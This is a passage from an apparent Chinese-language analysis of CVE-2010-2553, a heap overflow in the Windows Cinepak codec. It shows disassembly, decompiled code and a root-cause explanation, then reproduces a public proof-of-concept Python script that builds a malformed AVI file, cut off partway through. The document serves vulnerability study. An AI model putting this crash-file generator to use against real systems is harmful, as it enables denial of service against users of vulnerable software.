loc_73B723EA.text:73B72249.text:73B7224F 0F B6 56 03                   movzx   edx, byte ptr [esi+3].text:73B72253 33 C9                         xor     ecx, ecx.text:73B72255 8A 6E 01                      mov     ch, [esi+1].text:73B72258 8A 4E 02                      mov     cl, [esi+2].text:73B7225B C1 E1 08                      shl     ecx, 8.text:73B7225E 0B CA                         or      ecx, edx.text:73B72260 3B C1                         cmp     eax, ecx.text:73B72262 89 4D F8                      mov     [ebp+ulMinuend], ecx.text:73B72265 0F 82 7F 01 00 00             jb      loc_73B723EA.text:73B72265.text:73B7226B 8A 06                         mov     al, [esi].text:73B7226D 3C 10                         cmp     al, 10h.text:73B7226F 74 08                         jz      short loc_73B72279.text:73B7226F.text:73B72271 3C 11                         cmp     al, 11h.text:73B72273 0F 85 57 01 00 00             jnz     loc_73B723D0.text:73B72273.text:73B72279.text:73B72279                               loc_73B72279:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+C1↑j.text:73B72279 8D 45 08                      lea     eax, [ebp+arg_0].text:73B7227C 50                            push    eax                             ; pulResult.text:73B7227D 6A 0C                         push    0Ch                             ; ulSubtrahend.text:73B7227F FF 75 F8                      push    [ebp+ulMinuend]                 ; ulMinuend.text:73B72282 E8 FF FE FF FF                call    _ULongSub@12                    ; ULongSub(x,x,x).text:73B72282.text:73B72287 85 C0                         test    eax, eax.text:73B72289 0F 8C 65 01 00 00             jl      loc_73B723F4.text:73B72289.text:73B7228F 33 C0                         xor     eax, eax.text:73B72291 8A 66 08                      mov     ah, [esi+8].text:73B72294 33 C9                         xor     ecx, ecx.text:73B72296 8A 6E 04                      mov     ch, [esi+4].text:73B72299 8A 46 09                      mov     al, [esi+9].text:73B7229C 8A 4E 05                      mov     cl, [esi+5].text:73B7229F 2B C1                         sub     eax, ecx.text:73B722A1 66 0F AF 43 2E                imul    ax, [ebx+2Eh].text:73B722A6 89 45 0C                      mov     [ebp+arg_4], eax.text:73B722A9 8B 45 FC                      mov     eax, [ebp+var_4].text:73B722AC 3B C7                         cmp     eax, edi.text:73B722AE 74 21                         jz      short loc_73B722D1.text:73B722AE.text:73B722B0 80 7D 13 00                   cmp     byte ptr [ebp+arg_8+3], 0.text:73B722B4 75 1B                         jnz     short loc_73B722D1.text:73B722B4.text:73B722B6 80 3E 11                      cmp     byte ptr [esi], 11h.text:73B722B9 75 16                         jnz     short loc_73B722D1.text:73B722B9.text:73B722BB 8B 4B 1C                      mov     ecx, [ebx+1Ch].text:73B722BE 8D 3C 01                      lea     edi, [ecx+eax].text:73B722C1 B9 00 08 00 00                mov     ecx, 800h.text:73B722C6 8D B7 00 E0 FF FF             lea     esi, [edi-2000h].text:73B722CC F3 A5                         rep movsd.text:73B722CE 8B 75 E8                      mov     esi, [ebp+var_18].text:73B722CE.text:73B722D1.text:73B722D1                               loc_73B722D1:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+100↑j.text:73B722D1                                                                       ; CVDecompress(x,x,x,x,x,x,x)+106↑j.text:73B722D1                                                                       ; CVDecompress(x,x,x,x,x,x,x)+10B↑j.text:73B722D1 8B 7D F4                      mov     edi, [ebp+var_C].text:73B722D4 8B 43 20                      mov     eax, [ebx+20h].text:73B722D7 83 C7 0C                      add     edi, 0Ch.text:73B722DA 03 45 FC                      add     eax, [ebp+var_4].text:73B722DD 8D 4E 0C                      lea     ecx, [esi+0Ch].text:73B722E0 89 43 38                      mov     [ebx+38h], eax.text:73B722E3 8B 45 20                      mov     eax, [ebp+arg_18].text:73B722E6 89 4D E8                      mov     [ebp+var_18], ecx.text:73B722E9 89 43 3C                      mov     [ebx+3Ch], eax.text:73B722EC E9 BE 00 00 00                jmp     loc_73B723AF.text:73B722EC.text:73B722F1                               ; ---------------------------------------------------------------------------.text:73B722F1.text:73B722F1                               loc_73B722F1:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+205↓j.text:73B722F1 0F B6 41 03                   movzx   eax, byte ptr [ecx+3].text:73B722F5 33 D2                         xor     edx, edx.text:73B722F7 8A 71 01                      mov     dh, [ecx+1].text:73B722FA 8A 51 02                      mov     dl, [ecx+2].text:73B722FD C1 E2 08                      shl     edx, 8.text:73B72300 0B D0                         or      edx, eax.text:73B72302 39 55 08                      cmp     [ebp+arg_0], edx.text:73B72305 89 55 E0                      mov     [ebp+var_20], edx.text:73B72308 0F 82 AB 00 00 00             jb      loc_73B723B9.text:73B72308.text:73B7230E 0F B6 01                      movzx   eax, byte ptr [ecx].text:73B72311 83 C0 E0                      add     eax, 0FFFFFFE0h                 ; switch 19 cases.text:73B72314 83 F8 12                      cmp     eax, 12h.text:73B72317 77 7D                         ja      short def_73B72320              ; jumptable 73B72320 default case, cases 40-47.text:73B72317.text:73B72319 0F B6 80 10 24 B7 73          movzx   eax, ds:byte_73B72410[eax].text:73B72320 FF 24 85 F8 23 B7 73          jmp     ds:jpt_73B72320[eax*4]          ; switch jump.text:73B72320.text:73B72327                               ; ---------------------------------------------------------------------------.text:73B72327.text:73B72327                               loc_73B72327:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j.text:73B72327                                                                       ; DATA XREF: .text:jpt_73B72320↓o.text:73B72327 FF 73 30                      push    dword ptr [ebx+30h]             ; jumptable 73B72320 cases 32,33,36,37.text:73B7232A FF 73 34                      push    dword ptr [ebx+34h].text:73B7232D FF 73 38                      push    dword ptr [ebx+38h].text:73B72330 57                            push    edi.text:73B72331 FF 13                         call    dword ptr [ebx].text:73B72331.text:73B72333 EB 61                         jmp     short def_73B72320              ; jumptable 73B72320 default case, cases 40-47.text:73B72333.text:73B72335                               ; ---------------------------------------------------------------------------.text:73B72335.text:73B72335                               loc_73B72335:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j.text:73B72335                                                                       ; DATA XREF: .text:jpt_73B72320↓o.text:73B72335 FF 73 30                      push    dword ptr [ebx+30h]             ; jumptable 73B72320 cases 34,35,38,39.text:73B72338 8B 43 38                      mov     eax, [ebx+38h].text:73B7233B FF 73 34                      push    dword ptr [ebx+34h].text:73B7233E 05 00 10 00 00                add     eax, 1000h.text:73B72343 50                            push    eax.text:73B72344 57                            push    edi.text:73B72345 FF 53 04                      call    dword ptr [ebx+4].text:73B72345.text:73B72348 EB 4C                         jmp     short def_73B72320              ; jumptable 73B72320 default case, cases 40-47.text:73B72348.text:73B7234A                               ; ---------------------------------------------------------------------------.text:73B7234A.text:73B7234A                               loc_73B7234A:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j.text:73B7234A                                                                       ; DATA XREF: .text:jpt_73B72320↓o.text:73B7234A FF 75 0C                      push    [ebp+arg_4]                     ; jumptable 73B72320 case 48.text:73B7234D 83 C2 FC                      add     edx, 0FFFFFFFCh.text:73B72350 FF 75 1C                      push    [ebp+arg_14].text:73B72353 8D 47 04                      lea     eax, [edi+4].text:73B72356 FF 75 18                      push    [ebp+arg_10].text:73B72359 FF 75 14                      push    [ebp+arg_C].text:73B7235C 52                            push    edx.text:73B7235D 50                            push    eax.text:73B7235E 53                            push    ebx.text:73B7235F FF 53 08                      call    dword ptr [ebx+8].text:73B7235F.text:73B72362 EB 32                         jmp     short def_73B72320              ; jumptable 73B72320 default case, cases 40-47.text:73B72362.text:73B72364                               ; ---------------------------------------------------------------------------.text:73B72364.text:73B72364                               loc_73B72364:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j.text:73B72364                                                                       ; DATA XREF: .text:jpt_73B72320↓o.text:73B72364 FF 75 0C                      push    [ebp+arg_4]                     ; jumptable 73B72320 case 49.text:73B72367 83 C2 FC                      add     edx, 0FFFFFFFCh.text:73B7236A FF 75 1C                      push    [ebp+arg_14].text:73B7236D 8D 47 04                      lea     eax, [edi+4].text:73B72370 FF 75 18                      push    [ebp+arg_10].text:73B72373 FF 75 14                      push    [ebp+arg_C].text:73B72376 52                            push    edx.text:73B72377 50                            push    eax.text:73B72378 53                            push    ebx.text:73B72379 FF 53 10                      call    dword ptr [ebx+10h].text:73B72379.text:73B7237C EB 18                         jmp     short def_73B72320              ; jumptable 73B72320 default case, cases 40-47.text:73B7237C.text:73B7237E                               ; ---------------------------------------------------------------------------.text:73B7237E.text:73B7237E                               loc_73B7237E:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j.text:73B7237E                                                                       ; DATA XREF: .text:jpt_73B72320↓o.text:73B7237E FF 75 0C                      push    [ebp+arg_4]                     ; jumptable 73B72320 case 50.text:73B72381 83 C2 FC                      add     edx, 0FFFFFFFCh.text:73B72384 FF 75 1C                      push    [ebp+arg_14].text:73B72387 8D 47 04                      lea     eax, [edi+4].text:73B7238A FF 75 18                      push    [ebp+arg_10].text:73B7238D FF 75 14                      push    [ebp+arg_C].text:73B72390 52                            push    edx.text:73B72391 50                            push    eax.text:73B72392 53                            push    ebx.text:73B72393 FF 53 0C                      call    dword ptr [ebx+0Ch].text:73B72393.text:73B72396.text:73B72396                               def_73B72320:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+169↑j.text:73B72396                                                                       ; CVDecompress(x,x,x,x,x,x,x)+172↑j.text:73B72396                                                                       ; CVDecompress(x,x,x,x,x,x,x)+185↑j.text:73B72396                                                                       ; CVDecompress(x,x,x,x,x,x,x)+19A↑j.text:73B72396                                                                       ; CVDecompress(x,x,x,x,x,x,x)+1B4↑j.text:73B72396                                                                       ; CVDecompress(x,x,x,x,x,x,x)+1CE↑j.text:73B72396                                                                       ; DATA XREF: .text:jpt_73B72320↓o.text:73B72396 8B 55 E0                      mov     edx, [ebp+var_20]               ; jumptable 73B72320 default case, cases 40-47.text:73B72399 8B 4D E8                      mov     ecx, [ebp+var_18].text:73B7239C 33 C0                         xor     eax, eax.text:73B7239E 03 CA                         add     ecx, edx.text:73B723A0 40                            inc     eax.text:73B723A1 03 FA                         add     edi, edx.text:73B723A3 3B D0                         cmp     edx, eax.text:73B723A5 89 4D E8                      mov     [ebp+var_18], ecx.text:73B723A8 76 02                         jbe     short loc_73B723AC.text:73B723A8.text:73B723AA 8B C2                         mov     eax, edx.text:73B723AA.text:73B723AC.text:73B723AC                               loc_73B723AC:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+1FA↑j.text:73B723AC 29 45 08                      sub     [ebp+arg_0], eax.text:73B723AC.text:73B723AF.text:73B723AF                               loc_73B723AF:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+13E↑j.text:73B723AF 83 7D 08 04                   cmp     [ebp+arg_0], 4.text:73B723B3 0F 83 38 FF FF FF             jnb     loc_73B722F1.text:73B723B3.text:73B723B9.text:73B723B9                               loc_73B723B9:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15A↑j.text:73B723B9 0F BF 45 0C                   movsx   eax, word ptr [ebp+arg_4].text:73B723BD 0F AF 45 20                   imul    eax, [ebp+arg_18].text:73B723C1 01 45 1C                      add     [ebp+arg_14], eax.text:73B723C4 FF 45 EC                      inc     [ebp+var_14].text:73B723C7 81 45 FC 00 20 00 00          add     [ebp+var_4], 2000h.text:73B723CE 33 FF                         xor     edi, edi.text:73B723CE.text:73B723D0.text:73B723D0                               loc_73B723D0:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+C5↑j.text:73B723D0 8B 45 F8                      mov     eax, [ebp+ulMinuend].text:73B723D3 01 45 F4                      add     [ebp+var_C], eax.text:73B723D6 29 45 F0                      sub     [ebp+pulResult], eax.text:73B723D9 03 F0                         add     esi, eax.text:73B723DB 8B 45 E4                      mov     eax, [ebp+var_1C].text:73B723DE 39 45 EC                      cmp     [ebp+var_14], eax.text:73B723E1 89 75 E8                      mov     [ebp+var_18], esi.text:73B723E4 0F 8C 59 FE FF FF             jl      loc_73B72243.text:73B723E4.text:73B723EA.text:73B723EA                               loc_73B723EA:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+8C↑j.text:73B723EA                                                                       ; CVDecompress(x,x,x,x,x,x,x)+9B↑j.text:73B723EA                                                                       ; CVDecompress(x,x,x,x,x,x,x)+B7↑j.text:73B723EA 33 C0                         xor     eax, eax.text:73B723EC 40                            inc     eax.text:73B723EC.text:73B723ED.text:73B723ED                               loc_73B723ED:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+39↑j.text:73B723ED                                                                       ; CVDecompress(x,x,x,x,x,x,x)+248↓j.text:73B723ED 5F                            pop     edi.text:73B723EE 5E                            pop     esi.text:73B723EF 5B                            pop     ebx.text:73B723F0 C9                            leave.text:73B723F1 C2 1C 00                      retn    1Ch\n\n崩溃函数为 CVDecompress,其主调函数为 Decompress 。对 CVDecompress 函数反编译得到\nint __stdcall CVDecompress(ULONG a1, _BYTE *a2, unsigned int a3, int a4, int a5, int a6, int a7)&#123;  ULONG v7; // ebx  void *v8; // esi  int result; // eax  _BYTE *v10; // esi  int v11; // eax  unsigned __int16 v12; // ax  _BYTE *v13; // esi  unsigned __int16 v14; // cx  unsigned __int16 v15; // ax  unsigned __int16 v16; // cx  int v17; // eax  _BYTE *v18; // edi  _BYTE *v19; // ecx  unsigned __int16 v20; // dx  unsigned int v21; // edx  int v22; // eax  int v23; // [esp-4h] [ebp-30h]  unsigned int v24; // [esp+Ch] [ebp-20h]  int v25; // [esp+10h] [ebp-1Ch]  _BYTE *v26; // [esp+14h] [ebp-18h]  _BYTE *v27; // [esp+14h] [ebp-18h]  int v28; // [esp+18h] [ebp-14h]  ULONG pulResult; // [esp+1Ch] [ebp-10h] BYREF  _BYTE *v30; // [esp+20h] [ebp-Ch]  ULONG ulMinuend; // [esp+24h] [ebp-8h]  int v32; // [esp+28h] [ebp-4h]  v7 = a1;  v8 = *(void **)(a1 + 36);  if ( v8 )  &#123;    v23 = a7;    *(_DWORD *)(a1 + 36) = 0;    CVDecompress(v7, (int)v8, 9286, 0, 0, 0, v23);    LocalFree(v8);  &#125;  result = 0;  if ( a3 &gt;= 0x20 )  &#123;    v10 = a2;    BYTE1(result) = a2[1];    LOBYTE(result) = a2[2];    v11 = (unsigned __int8)a2[3] | (result &lt;&lt; 8);    if ( (int)a3 &lt; v11 )      return 0;    HIBYTE(a3) = *a2;    if ( ULongSub(v11, 0xAu, &amp;pulResult) &lt; 0 )    &#123;      return 0;    &#125;    else    &#123;      HIBYTE(v12) = v10[8];      v13 = v10 + 10;      v28 = 0;      v26 = v13;      v30 = v13;      LOBYTE(v12) = *(v13 - 1);      v25 = v12;      if ( v12 )      &#123;        v32 = 0;        do        &#123;          if ( pulResult &lt; 0x16 )            break;          HIBYTE(v14) = v13[1];          LOBYTE(v14) = v13[2];          ulMinuend = (unsigned __int8)v13[3] | (v14 &lt;&lt; 8);          if ( pulResult &lt; ulMinuend )            break;          if ( *v13 == 16 || *v13 == 17 )          &#123;            if ( ULongSub(ulMinuend, 0xCu, &amp;a1) &lt; 0 )              return 0;            HIBYTE(v15) = v13[8];            HIBYTE(v16) = v13[4];            LOBYTE(v15) = v13[9];            LOBYTE(v16) = v13[5];            v17 = v15 - v16;            LOWORD(v17) = *(_WORD *)(v7 + 46) * v17;            a2 = (_BYTE *)v17;            if ( v32 &amp;&amp; !HIBYTE(a3) &amp;&amp; *v13 == 17 )            &#123;              qmemcpy(                (void *)(*(_DWORD *)(v7 + 28) + v32),                (const void *)(*(_DWORD *)(v7 + 28) + v32 - 0x2000),                0x2000u);              v13 = v26;            &#125;            v18 = v30 + 12;            v19 = v13 + 12;            *(_DWORD *)(v7 + 56) = v32 + *(_DWORD *)(v7 + 32);            v27 = v13 + 12;            *(_DWORD *)(v7 + 60) = a7;            while ( a1 &gt;= 4 )            &#123;              HIBYTE(v20) = v19[1];              LOBYTE(v20) = v19[2];              v21 = (unsigned __int8)v19[3] | (v20 &lt;&lt; 8);              v24 = v21;              if ( a1 &lt; v21 )                break;              switch ( *v19 )              &#123;                case &#x27; &#x27;:                case &#x27;!&#x27;:                case &#x27;$&#x27;:                case &#x27;%&#x27;:                  (*(void (__stdcall **)(_BYTE *, _DWORD, _DWORD, _DWORD))v7)(                    v18,                    *(_DWORD *)(v7 + 56),                    *(_DWORD *)(v7 + 52),                    *(_DWORD *)(v7 + 48));                  break;                case &#x27;&quot;&#x27;:                case &#x27;#&#x27;:                case &#x27;&amp;&#x27;:                case &#x27;\\&#x27;&#x27;:                  (*(void (__stdcall **)(_BYTE *, int, _DWORD, _DWORD))(v7 + 4))(                    v18,                    *(_DWORD *)(v7 + 56) + 4096,                    *(_DWORD *)(v7 + 52),                    *(_DWORD *)(v7 + 48));                  break;                case &#x27;0&#x27;:                  (*(void (__stdcall **)(ULONG, _BYTE *, unsigned int, int, int, int, _BYTE *))(v7 + 8))(                    v7,                    v18 + 4,                    v21 - 4,                    a4,                    a5,                    a6,                    a2);                  break;                case &#x27;1&#x27;:                  (*(void (__stdcall **)(ULONG, _BYTE *, unsigned int, int, int, int, _BYTE *))(v7 + 16))(                    v7,                    v18 + 4,                    v21 - 4,                    a4,                    a5,                    a6,                    a2);                  break;                case &#x27;2&#x27;:                  (*(void (__stdcall **)(ULONG, _BYTE *, unsigned int, int, int, int, _BYTE *))(v7 + 12))(                    v7,                    v18 + 4,                    v21 - 4,                    a4,                    a5,                    a6,                    a2);                  break;                default:                  break;              &#125;              v19 = &amp;v27[v24];              v22 = 1;              v18 += v24;              v27 += v24;              if ( v24 &gt; 1 )                v22 = v24;              a1 -= v22;            &#125;            a6 += a7 * (__int16)a2;            ++v28;            v32 += 0x2000;          &#125;          v30 += ulMinuend;          pulResult -= ulMinuend;          v13 += ulMinuend;          v26 = v13;        &#125;        while ( v28 &lt; v25 );      &#125;      return 1;    &#125;  &#125;  return result;&#125;\n\n异常发生在 qmemcpy 语句。使用 LLM 辅助阅读一下这下代码,异常触发时的执行流程为,程序判断 CVID Chunk 的数据长度是否大于 0x20,是则获取其 Strip 个数,并逐个处理 Strip,若 Strip ID 为 0x1100 则进行数据复制,每次复制 0x2000 字节。而程序在复制时并没有判断所用的 0x6000 大小的堆块剩余空间是否充足,因此当 ID 为 0x1100 的 Strip 个数大于 3 时将发生堆溢出,且溢出的内存中包含了内存状态为 MEM_RESERVE 的内存,故触发 Access violation\n漏洞利用MSF 没有该漏洞利用的相关模块,在互联网搜索引擎中也暂未找到相关利用样本。个人感觉该漏洞难以进行更进一步的利用的原因在于其难以控制 EIP 指针因此无法执行 payload。而若只需要使程序崩溃进行 DOS 的话利用样本生成脚本生成攻击脚本即可\nExploit 分析ABYSSSEC 在 exploit-db 上公布了 POC 文件生成脚本,为方便理解在此借用 sp4n9x’s Blog 中给出的注释版本\n# -*- coding: UTF-8 -*-&#x27;&#x27;&#x27;  __  __  ____         _    _ ____ |  \\/  |/ __ \\   /\\  | |  | |  _ \\  | \\  / | |  | | /  \\ | |  | | |_) | | |\\/| | |  | |/ /\\ \\| |  | |  _ &lt;  | |  | | |__| / ____ \\ |__| | |_) | |_|  |_|\\____/_/    \\_\\____/|____/ http://www.exploit-db.com/moaub-26-microsoft-cinepak-codec-cvdecompress-heap-overflow-ms10-055/https://www.exploit-db.com/exploits/15112  Title             : Microsoft Cinepak Codec CVDecompress Heap Overflow  Version           : iccvid.dll XP SP3  Analysis          : http://www.abysssec.com  Vendor            : http://www.microsoft.com  Impact            : High  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com  Twitter           : @abysssec  CVE               : CVE-2010-2553  MOAUB Number      : &#x27;&#x27;&#x27;import sysdef main():    aviHeaders = (        &quot;\\x52\\x49\\x46\\x46&quot; # dwList = &quot;RIFF&quot;        &quot;\\x58\\x01\\x00\\x00&quot; # dwSize = 0x158 = 344 byte        &quot;\\x41\\x56\\x49\\x20&quot; # dwFourCC = &quot;AVI &quot;        &quot;\\x4C\\x49\\x53\\x54&quot;    # dwList = &quot;LIST&quot; &lt;---------------------------+        &quot;\\xC8\\x00\\x00\\x00&quot;    # dwSize = 0xc8 = 200 byte                    |        &quot;\\x68\\x64\\x72\\x6C&quot;    # dwFourCC = &quot;hdrl&quot;                           |        &quot;\\x61\\x76\\x69\\x68&quot;        # dwFourCC = &quot;avih&quot; &lt;-----------+         |        &quot;\\x38\\x00\\x00\\x00&quot;        # dwSize = 0x38 = 56 byte       |         |        &quot;\\xA0\\x86\\x01\\x00&quot;        # dwMicroSecPerFrame = 0x186A0  |         |        &quot;\\x00\\x00\\x00\\x00&quot;        # dwMaxBytesPerSec = 0x0        |         |        &quot;\\x00\\x00\\x00\\x00&quot;        # dwPaddingGranularity = 0x0    |         |        &quot;\\x10\\x01\\x00\\x00&quot;        # dwFlages = 0x110              |         |        &quot;\\x4E\\x00\\x00\\x00&quot;        # dwTotalFrame = 0x4E = 78      |         |        &quot;\\x00\\x00\\x00\\x00&quot;        # dwInitialFrames = 0x0       &quot;avih&quot;      |        &quot;\\x01\\x00\\x00\\x00&quot;        # dwStreams = 0x1               |         |        &quot;\\x00\\x00\\x00\\x00&quot;        # dwSuggestedBufferSize = 0x0   |         |        &quot;\\x60\\x01\\x00\\x00&quot;        # dwWidth = 0x160 = 352         |         |        &quot;\\x20\\x01\\x00\\x00&quot;        # dwHeight = 0x120 = 288        |         |        &quot;\\x00\\x00\\x00\\x00&quot;        # dwReserved[0]                 |         |        &quot;\\x00\\x00\\x00\\x00&quot;        # dwReserved[1]                 |         |        &quot;\\x00\\x00\\x00\\x00&quot;        # dwReserved[2]                 |         |        &quot;\\x00\\x00\\x00\\x00&quot;        # dwReserved[3] &lt;---------------+         |        &quot;\\x4C\\x49\\x53\\x54&quot;        # dwList = &quot;LIST&quot; &lt;------------------+    |        &quot;\\x7C\\x00\\x00\\x00&quot;        # dwSize = 0x7C = 124 byte           |    |        &quot;\\x73\\x74\\x72\\x6C&quot;        # dwFourCC = &quot;strl&quot;                  |    |        &quot;\\x73\\x74\\x72\\x68&quot;            # dwFourCC = &quot;strh&quot; &lt;-------+    |    |        &quot;\\x38\\x00\\x00\\x00&quot;            # dwSize = 0x38 = 56 byte   |    |    |        &quot;\\x76\\x69\\x64\\x73&quot;            # fccType = &quot;vids&quot;          |    |    |        &quot;\\x63\\x76\\x69\\x64&quot;            # fccHandler = &quot;cvid&quot;       |    |    |        &quot;\\x00\\x00\\x00\\x00&quot;            # dwFlags = 0x0             |    |    |        &quot;\\x00\\x00&quot;                    # wPriority = 0x0           |    |    |        &quot;\\x00\\x00&quot;                    # wLanguage = 0x0           |    |    |        &quot;\\x00\\x00\\x00\\x00&quot;            # dwInitalFrames = 0x0      |    | &quot;hdrl&quot;        &quot;\\xE8\\x03\\x00\\x00&quot;            # dwScale = 0x3E8 = 1000 &quot;strh&quot;  |    |        &quot;\\x10\\x27\\x00\\x00&quot;            # dwRate = 0x2710 = 10000   |    |    |        &quot;\\x00\\x00\\x00\\x00&quot;            # dwStart = 0x0             |    |    |        &quot;\\x4E\\x00\\x00\\x00&quot;            # dwLength = 0x4E = 78      |    |    |        &quot;\\x20\\x74\\x00\\x00&quot;            # dwSuggestedBufferSize     |    |    |     ; 0x7420=29728        &quot;\\xFF\\xFF\\xFF\\xFF&quot;            # dwQuality = -1            |    |    |        &quot;\\x00\\x00\\x00\\x00&quot;            # dwSampleSize = 0x0        |    |    |        &quot;\\x00\\x00&quot;                        # left = 0x0            | &quot;strl&quot;  |        &quot;\\x00\\x00&quot;                        # top = 0x0             |    |    |        &quot;\\x60\\x01&quot;                        # right = 0x160 = 352   |    |    |        &quot;\\x20\\x01&quot;                        # bottom =0x120 = 288&lt;--+    |    |        &quot;\\x73\\x74\\x72\\x66&quot;            # dwFourCC = &quot;strf&quot; &lt;-------+    |    |        &quot;\\x28\\x00\\x00\\x00&quot;            # dwSize = 0x28 = 40 byte   |    |    |        &quot;\\x28\\x00\\x00\\x00&quot;            # biSize = 0x28 = 40 byte   |    |    |        &quot;\\x50\\x01\\x00\\x00&quot;            # biWidth = 0x150 = 336     |    |    |        &quot;\\x20\\x01\\x00\\x00&quot;            # biHeight =0x120 = 288     |    |    |        &quot;\\x01\\x00&quot;                    # biPlanes = 0x1         &quot;strf&quot;  |    |        &quot;\\x18\\x00&quot;                    # biBitCount = 0x18 = 24    |    |    |        &quot;\\x63\\x76\\x69\\x64&quot;            # biCompression = &quot;cvid&quot;    |    |    |        &quot;\\x84\\x8D\\x00\\x00&quot;            # biSizeImage=0x8D84=36228  |    |    |        &quot;\\x00\\x00\\x00\\x00&quot;            # biXPelsPerMeter = 0x0     |    |    |        &quot;\\x00\\x00\\x00\\x00&quot;            # biYPelsPerMeter = 0x0     |    |    |        &quot;\\x00\\x00\\x00\\x00&quot;            # biClrUsed = 0x0           |    |    |        &quot;\\x00\\x00\\x00\\x00&quot;            # biClrImportant = 0x0 &lt;----+    |    |    )                                 #                                |    |                                      #                                |    |    padding =    (                    #                                |    |        &quot;\\x4A\\x55\\x4E\\x4B&quot;            # dwFourCC = &quot;JUNK&quot;              |    |        &quot;\\x00\\x00\\x00\\x00&quot;            # dwSize = 0x0 &lt;-----------------+----+        &quot;\\x4A\\x55\\x4E\\x4B&quot;        # dwFourCC = &quot;JUNK&quot;                             &quot;\\x00\\x00\\x00\\x00&quot;        # dwSize = 0x0     )               movi_tag =   (        &quot;\\x4C\\x49\\x53\\x54&quot;    # dwList = &quot;LIST&quot; &lt;-----------------------------------------+        &quot;\\x5C\\x00\\x00\\x00&quot;    # dwSize = 0x5C = 92 byte                                   |        &quot;\\x6D\\x6F\\x76\\x69&quot;    # dwFourCC = &quot;movi&quot;                                         |        &quot;\\x30\\x30\\x64\\x63&quot;        # dwFourCC = &quot;00dc&quot;                                     |   ; 压缩视频帧数据块        &quot;\\x10\\x00\\x00\\x00&quot;        # dwSize = 0x10 = 16 byte                               |        )                         #                                                       |                                  #                                                       |    cinepak_codec_data1 = (       #                                                       |        &quot;\\x00&quot;                    # Flags &lt;-------------------+                           |   ; Flags = 0x0        &quot;\\x00\\x00\\x68&quot;            # Length of CVID data       |                           |   ; Length of CVID data = 0x68 = 104        &quot;\\x01\\x60&quot;                # Width of coded frame &quot;Frame Header&quot;                   |   ; Width of coded frame = 0x160 = 352        &quot;\\x01\\x20&quot;                # Height of coded frame     |                           |   ; Height of coded frame = 0x120 = 288    )                             #                           |                           |                                  #                           |                           |    number_of_coded_strips = (    #                           |                           |        &quot;\\x00\\x10&quot;                # Number of coded strips &lt;--+                           |   ; number_of_coded_strips = 0x10 = 16        )                         #                                                       |    cinepak_codec_data2 = (       #                                                       |        &quot;\\x10\\x00&quot;                # Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1000 - Intra-coded strip        &quot;\\x00\\x10&quot;                # Size of strip data        |                           |   ; Size of strip data = 0x10 = 16        &quot;\\x00\\x00&quot;                # Strips top Y position &quot;Strip Header&quot;                  |   ; Strips top Y position = 0x0        &quot;\\x00\\x00&quot;                # Strips top X position     |                           |   ; Strips top X position = 0x0        &quot;\\x00\\x60&quot;                # Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x60 = 96        &quot;\\x01\\x60&quot;                # Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x160 = 352        &quot;\\x20\\x00&quot;                # CVID Chunk ID &lt;-----------+ &quot;CVID Chunk&quot;              |   ; CVID Chunk ID = 0x2000 - List of blocks in 12 bit V4 codebook        &quot;\\x00\\x00&quot;                # Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x0        &quot;\\x11\\x00&quot;                # Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip        &quot;\\x00\\x10&quot;                # Size of strip data        |                           |   ; Size of strip data = 0x10 = 16        &quot;\\x41\\x41&quot;                # Strips top Y position &quot;Strip Header&quot;               &quot;movi&quot; ; Strips top Y position = 0x4141        &quot;\\x41\\x41&quot;                # Strips top X position     |                           |   ; Strips top X position = 0x4141        &quot;\\x41\\x41&quot;                # Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141        &quot;\\x41\\x41&quot;                # Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x4141        &quot;\\x41\\x41&quot;                # CVID Chunk ID &lt;-----------+ &quot;CVID Chunk&quot;              |   ; CVID Chunk ID = 0x4141        &quot;\\x41\\x41&quot;                # Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x4141        &quot;\\x11\\x00&quot;                # Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip        &quot;\\x00\\x10&quot;                # Size of strip data        |                           |   ; Size of strip data = 0x10 = 16        &quot;\\x41\\x41&quot;                # Strips top Y position &quot;Strip Header&quot;                  |   ; Strips top Y position = 0x4141        &quot;\\x41\\x41&quot;                # Strips top X position     |                           |   ; Strips top X position = 0x4141        &quot;\\x41\\x41&quot;                # Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141        &quot;\\x41\\x41&quot;                # Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x4141        &quot;\\x41\\x41&quot;                # CVID Chunk ID &lt;-----------+ &quot;CVID Chunk&quot;              |   ; CVID Chunk ID = 0x4141        &quot;\\x41\\x41&quot;                # Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x4141        &quot;\\x11\\x00&quot;                # Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip        &quot;\\x00\\x10&quot;                # Size of strip data        |                           |   ; Size of strip data = 0x10 = 16        &quot;\\x41\\x41&quot;                # Strips top Y position &quot;Strip Header&quot;                  |   ; Strips top Y position = 0x4141        &quot;\\x41\\x41&quot;                # Strips top X position     |                           |   ; Strips top X position = 0x4141        &quot;\\x41\\x41&quot;                # Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141        &quot;\\x41\\x41&quot;                # Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 